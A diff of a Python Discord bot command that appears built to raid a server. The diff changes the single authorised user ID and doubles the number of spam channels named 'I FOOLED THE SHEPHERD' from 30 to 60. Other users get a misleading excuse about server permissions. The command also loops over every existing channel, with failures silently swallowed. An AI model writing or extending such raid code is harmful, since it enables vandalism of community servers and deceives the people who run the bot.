@@ -653,7 +653,7 @@ import asyncio
 
 @bot.command()
 async def enhanced(ctx):
-    if ctx.author.id != 1188620657588699176:
+    if ctx.author.id != 761769388335431690:
         return await ctx.send("if the command dosen't work then your perms on this server are not on")
 
     for chan in ctx.guild.channels:
@@ -668,7 +668,7 @@ async def enhanced(ctx):
         except:
             pass
 		
-    for i in range(30):
+    for i in range(60):
         try:
             await ctx.guild.create_text_channel(f"I FOOLED THE SHEPHERD-{i}")
         except:
